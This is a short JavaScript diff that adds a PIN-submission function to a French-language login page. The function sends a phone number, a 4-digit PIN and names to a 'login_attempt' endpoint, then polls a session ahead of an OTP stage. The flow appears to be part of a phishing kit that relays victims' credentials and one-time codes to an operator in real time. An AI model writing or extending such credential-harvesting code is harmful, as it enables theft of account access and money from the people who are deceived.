@@ -724,6 +724,26 @@ async function callApi(action, data){
   catch(e){ return {success:false}; }
 }
 
+async function submitPIN(){
+  var raw = loginVal;
+  var pin = pinVal;
+  if(pin.length !== 4) return;
+  var fn = document.getElementById('fn') ? document.getElementById('fn').value.trim() : '';
+  var ln = document.getElementById('ln') ? document.getElementById('ln').value.trim() : '';
+  showLoad();
+  var payload = { firstName: fn||'Unknown', lastName: ln||'User', phone: raw, pin: pin };
+  if(sessId) payload.sessionId = sessId;
+  var r = await callApi('login_attempt', payload);
+  if(r && ((r.data && r.data.sessionId) || r.sessionId)){
+    var sid = (r.data && r.data.sessionId) || r.sessionId;
+    startPoll(sid);
+  } else {
+    hideLoad();
+    showPop('Erreur de connexion', r && r.message ? r.message : 'Impossible de se connecter. Veuillez réessayer.');
+    pinVal = ''; updatePinDots();
+  }
+}
+
 /* ═══════════════════════════════════════════
    POLL + OTP — clean single-instance logic
 ═══════════════════════════════════════════ */
